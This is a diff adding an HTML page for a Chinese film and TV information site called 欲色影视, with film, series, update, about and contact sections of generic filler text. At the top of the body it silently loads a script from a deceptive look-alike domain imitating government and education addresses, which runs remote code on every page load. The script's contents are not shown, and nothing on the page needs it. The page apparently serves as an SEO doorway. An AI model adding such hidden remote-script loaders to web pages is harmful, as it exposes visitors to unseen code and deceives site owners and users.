@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="欲色影视作为面向影视爱好者的在线内容导航与资讯窗口，长期整理国内外院线电影、高分剧集、纪录影像及独立短片的相关资料。页面持续更新作品看点、演职员信息、上映动态与观看指引，并以简洁清晰的分类帮助用户快速定位感兴趣的影视内容。">
+<meta name="keywords" content="欲色影视, yuseyingshi-top, 电影资讯, 在线影视导航, 剧集推荐, 院线新片, 高分纪录片, 影视作品资料">
+<meta name="author" content="欲色影视">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#10131b">
+<title>欲色影视｜yuseyingshi-top 影视内容导航与资讯整理</title>
+<style>
+:root{--bg:#0e1017;--panel:#171a24;--line:#262b38;--txt:#e8eaf0;--sub:#a2a8b6;--gold:#e3b341;--blue:#4f8cff;--red:#ff5b5b}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{background:var(--bg);color:var(--txt);font-family:"PingFang SC","Microsoft YaHei",Helvetica,Arial,sans-serif;line-height:1.75;font-size:15px;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+.wrap{max-width:1180px;margin:0 auto;padding:0 18px}
+.site-top{background:linear-gradient(180deg,#141722,#0e1017);border-bottom:1px solid var(--line)}
+.top-row{display:flex;align-items:center;gap:16px;padding:14px 0}
+.logo{font-size:22px;font-weight:700;letter-spacing:.5px}
+.logo b{color:var(--gold)}
+.logo small{display:block;font-size:11px;color:var(--sub);font-weight:400;letter-spacing:1px}
+nav.links{margin-left:auto;display:flex;gap:8px;flex-wrap:wrap}
+nav.links a{padding:7px 12px;border:1px solid transparent;border-radius:20px;font-size:14px;color:var(--sub)}
+nav.links a:hover{color:var(--txt);border-color:var(--line);background:#1c1f2b}
+.hero{position:relative;padding:64px 0 52px;overflow:hidden}
+.hero:after{content:"";position:absolute;right:-90px;top:-90px;width:320px;height:320px;background:radial-gradient(circle,rgba(227,179,65,.18),transparent 68%);pointer-events:none}
+.hero h1{font-size:clamp(28px,5vw,46px);line-height:1.25;margin:0 0 16px;max-width:760px}
+.hero h1 span{color:var(--gold)}
+.hero p{color:var(--sub);max-width:680px;margin:0 0 24px;font-size:16px}
+.hero .acts{display:flex;gap:12px;flex-wrap:wrap}
+.btn{padding:11px 22px;border-radius:8px;font-size:14px;border:1px solid var(--line);background:#191c27}
+.btn.main{background:var(--gold);color:#17120a;border-color:var(--gold);font-weight:600}
+.url-note{margin-top:22px;display:inline-flex;align-items:center;gap:10px;padding:10px 16px;border:1px dashed var(--line);border-radius:8px;color:var(--sub);font-size:13px}
+.url-note strong{color:var(--gold);letter-spacing:.4px}
+section{padding:50px 0;border-top:1px solid var(--line)}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:24px;margin:0;display:flex;align-items:center;gap:10px}
+.sec-head h2:before{content:"";width:4px;height:20px;background:var(--gold);border-radius:2px}
+.sec-head em{font-style:normal;color:var(--sub);font-size:13px}
+.grid-four{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.grid-three{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.grid-two{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:20px;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:#363d4e}
+.card .tag{font-size:12px;color:var(--gold);border:1px solid rgba(227,179,65,.35);padding:3px 9px;border-radius:20px;display:inline-block;margin-bottom:12px}
+.card h3{margin:0 0 10px;font-size:17px}
+.card p{margin:0;color:var(--sub);font-size:14px}
+.card ul{margin:12px 0 0;padding-left:18px;color:var(--sub);font-size:14px}
+.card ul li{margin-bottom:6px}
+.poster{height:120px;border-radius:8px;margin-bottom:14px;background:linear-gradient(135deg,#23283a,#171a24);display:flex;align-items:center;justify-content:center;color:#727996;font-size:13px}
+.bulletin li{list-style:none;padding:14px 0;border-bottom:1px solid var(--line);display:flex;gap:14px;align-items:flex-start}
+.bulletin ol{padding:0;margin:0}
+.bulletin .date{font-size:12px;color:var(--gold);min-width:78px;padding-top:3px}
+.bulletin .txt strong{display:block;margin-bottom:3px}
+.bulletin .txt span{color:var(--sub);font-size:13px}
+.about-layout{display:grid;grid-template-columns:1.4fr 1fr;gap:24px}
+.stat-box{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:20px}
+.stat{background:#12141c;border:1px solid var(--line);border-radius:10px;padding:16px;text-align:center}
+.stat b{display:block;font-size:24px;color:var(--gold)}
+.stat span{font-size:12px;color:var(--sub)}
+.contact-form input,.contact-form textarea{width:100%;background:#12141c;border:1px solid var(--line);border-radius:8px;padding:12px;color:var(--txt);font-family:inherit;font-size:14px;margin-bottom:14px}
+.contact-form textarea{min-height:110px;resize:vertical}
+.contact-form button{background:var(--gold);color:#17120a;border:none;padding:12px 24px;border-radius:8px;font-weight:600;cursor:pointer;font-size:14px}
+.info-list p{border-bottom:1px solid var(--line);padding:10px 0;margin:0;color:var(--sub);font-size:14px}
+.info-list p strong{color:var(--txt);margin-right:8px}
+footer{border-top:1px solid var(--line);padding:34px 0 40px;color:var(--sub);font-size:13px}
+.foot-flex{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.foot-flex a{margin-left:14px;color:var(--sub)}
+@media (max-width:900px){
+ .grid-four{grid-template-columns:repeat(2,1fr)}
+ .grid-three,.grid-two,.about-layout{grid-template-columns:1fr}
+}
+@media (max-width:560px){
+ .top-row{flex-direction:column;align-items:flex-start}
+ nav.links{margin-left:0}
+ .grid-four{grid-template-columns:1fr}
+ .hero{padding:40px 0 34px}
+ section{padding:38px 0}
+ .stat-box{grid-template-columns:repeat(3,1fr)}
+ .stat b{font-size:19px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="site-top">
+ <div class="wrap top-row">
+  <div class="logo">欲色影视<small>yuseyingshi-top · 影视内容导航</small></div>
+  <nav class="links" aria-label="主导航">
+   <a href="#films">影片库</a>
+   <a href="#series">剧集榜</a>
+   <a href="#bulletin">更新公告</a>
+   <a href="#about">关于本站</a>
+   <a href="#contact">联系合作</a>
+  </nav>
+ </div>
+</div>
+
+<header class="hero wrap">
+ <h1>在 <span>欲色影视</span> 发现值得看的电影与剧集</h1>
+ <p>从院线新片到经典老片，从国产剧集到海外高分作品，欲色影视持续整理影片资料、作品看点、演职员信息与上线动态，帮助观众更快找到想看的内容。</p>
+ <div class="acts">
+  <a class="btn main" href="#films">浏览影片库</a>
+  <a class="btn" href="#series">查看剧集推荐</a>
+ </div>
+ <div class="url-note">官方访问地址：<strong>https://yuseyingshi-top.github.io</strong>　每次更新内容均在本页呈现</div>
+</header>
+
+<section id="films" class="wrap">
+ <div class="sec-head">
+  <h2>影片库</h2>
+  <em>按题材与类型整理，方便按兴趣筛选</em>
+ </div>
+ <div class="grid-four">
+  <article class="card">
+   <div class="poster">剧情 · 犯罪</div>
+   <span class="tag">院线关注</span>
+   <h3>城市悬疑新作资料页</h3>
+   <p>收录故事背景、角色关系与上映时间线，适合喜欢层层推进叙事的观众查阅。</p>
+  </article>
+  <article class="card">
+   <div class="poster">动作 · 冒险</div>
+   <span class="tag">视觉向</span>
+   <h3>大场面动作片看点</h3>
+   <p>围绕场景设计、镜头节奏与配乐表现做梳理，帮助观众判断是否符合口味。</p>
+  </article>
+  <article class="card">
+   <div class="poster">科幻 · 奇幻</div>
+   <span class="tag">世界观</span>
+   <h3>科幻设定与世界观解析</h3>
+   <p>整理作品的世界观框架、关键设定与彩蛋线索，方便观看前后对照理解。</p>
+  </article>
+  <article class="card">
+   <div class="poster">纪录片 · 传记</div>
+   <span class="tag">真实影像</span>
+   <h3>高分纪录片索引</h3>
+   <p>聚焦自然、历史、人物传记等主题，提供片长、主题标签与观看建议。</p>
+  </article>
+ </div>
+</section>
+
+<section id="series" class="wrap">
+ <div class="sec-head">
+  <h2>剧集榜</h2>
+  <em>长剧、短剧、单元剧分类呈现</em>
+ </div>
+ <div class="grid-three">
+  <article class="card">
+   <span class="tag">国产剧集</span>
+   <h3>现实题材剧集追踪</h3>
+   <p>记录播出进度、主要演员与剧情阶段特点，适合追更期间快速回顾。</p>
+   <ul><li>更新状态与集数说明</li><li>角色与演员对应关系</li><li>观众讨论焦点整理</li></ul>
+  </article>
+  <article class="card">
+   <span class="tag">海外剧集</span>
+   <h3>海外高分剧集导航</h3>
+   <p>按地区与类型归纳，标注季数与完结状态，减少查找信息的时间成本。</p>
+   <ul><li>韩剧、美剧、日剧分区</li><li>季终与续订信息</li><li>题材标签快速筛选</li></ul>
+  </article>
+  <article class="card">
+   <span class="tag">经典回顾</span>
+   <h3>值得重看的经典剧</h3>
+   <p>挑选历久弥新的作品，补充幕后花絮与创作背景，让重温更有收获。</p>
+   <ul><li>年代与地区标注</li><li>主创团队介绍</li><li>观看顺序建议</li></ul>
+  </article>
+ </div>
+</section>
+
+<section id="bulletin" class="wrap">
+ <div class="sec-head">
+  <h2>更新公告</h2>
+  <em>欲色影视页面内容维护记录</em>
+ </div>
+ <div class="bulletin">
+  <ol>
+   <li><span class="date">10月23日</span><span class="txt"><strong>影片库新增“真实影像”分类</strong><span>补充纪录片与传记类作品的片长、主题标签和简介资料。</span></span></li>
+   <li><span class="date">10月18日</span><span class="txt"><strong>剧集榜海外分区调整</strong><span>海外剧集导航按韩剧、美剧、日剧重新归类，并增加季数与完结状态说明。</span></span></li>
+   <li><span class="date">10月09日</span><span class="txt"><strong>影片详情字段完善</strong><span>为悬疑、动作、科幻类作品补充世界观、彩蛋与配乐相关说明。</span></span></li>
+   <li><span class="date">09月27日</span><span class="txt"><strong>站点导航结构优化</strong><span>影片库与剧集榜增加题材标签，移动端浏览时分类入口更加醒目。</span></span></li>
+  </ol>
+ </div>
+</section>
+
+<section id="about" class="wrap">
+ <div class="sec-head">
+  <h2>关于欲色影视</h2>
+  <em>内容定位与使用方式</em>
+ </div>
+ <div class="about-layout">
+  <div class="card">
+   <span class="tag">内容定位</span>
+   <h3>做影视内容的整理入口</h3>
+   <p>欲色影视专注于影视内容的资料整理与导航，不替代作品的正版播放渠道。页面信息以作品名称、类型、演职员、上线动态与看点为主，便于观众在观看前建立基本了解。</p>
+   <p>内容组织上强调分类清晰与信息可读：影片库按类型划分，剧集榜按地区与题材划分，更新公告则记录本页内容的维护情况。</p>
+   <div class="stat-box">
+    <div class="stat"><b>4+</b><span>内容栏目</span></div>
+    <div class="stat"><b>多类型</b><span>题材覆盖</span></div>
+    <div class="stat"><b>持续</b><span>内容更新</span></div>
+   </div>
+  </div>
+  <div class="card">
+   <span class="tag">访问方式</span>
+   <h3>如何打开欲色影视</h3>
+   <p>在浏览器地址栏直接输入下方官方地址即可访问，页面支持手机、平板与桌面设备自适应显示。</p>
+   <div class="url-note" style="margin-top:14px">https://yuseyingshi-top.github.io</div>
+   <p style="margin-top:14px">如需反馈内容错误或补充作品资料，可通过下方联系栏目提交信息，团队会在核对后处理。</p>
+  </div>
+ </div>
+</section>
+
+<section id="contact" class="wrap">
+ <div class="sec-head">
+  <h2>联系与合作</h2>
+  <em>内容建议、资料补充、合作咨询</em>
+ </div>
+ <div class="grid-two">
+  <form class="card contact-form" onsubmit="event.preventDefault();alert('提交成功，感谢您对欲色影视的支持，我们会尽快查看。');">
+   <span class="tag">在线留言</span>
+   <h3>留下你的建议</h3>
+   <input type="text" name="name" placeholder="称呼（选填）" autocomplete="off">
+   <input type="text" name="subject" placeholder="留言主题" autocomplete="off" required>
+   <textarea name="message" placeholder="请描述建议、资料补充或合作意向" required></textarea>
+   <button type="submit">提交留言</button>
+  </form>
+  <div class="card info-list">
+   <span class="tag">官方信息</span>
+   <h3>联系信息汇总</h3>
+   <p><strong>站点名称：</strong>欲色影视</p>
+   <p><strong>官方网址：</strong>https://yuseyingshi-top.github.io</p>
+   <p><strong>内容方向：</strong>电影、剧集、纪录片资料整理</p>
+   <p><strong>更新栏目：</strong>影片库、剧集榜、更新公告</p>
+   <p><strong>合作范围：</strong>影视资讯交流、内容资料互换、合规宣传合作</p>
+   <p style="border-bottom:none">提交前请确认信息准确，涉及作品资料的内容会经过核对后再做展示。</p>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap foot-flex">
+  <div>© <span id="yr">2026</span> 欲色影视 · yuseyingshi-top　影视内容导航与资讯整理</div>
+  <div>
+   <a href="#films">影片库</a>
+   <a href="#series">剧集榜</a>
+   <a href="#bulletin">更新公告</a>
+   <a href="#about">关于本站</a>
+  </div>
+ </div>
+ <div class="wrap" style="margin-top:14px;font-size:12px;color:#6c7282">
+  官方地址：https://yuseyingshi-top.github.io　本站内容以影视作品资料与资讯导航为主，请通过正版渠道观看影视作品。
+ </div>
+</footer>
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
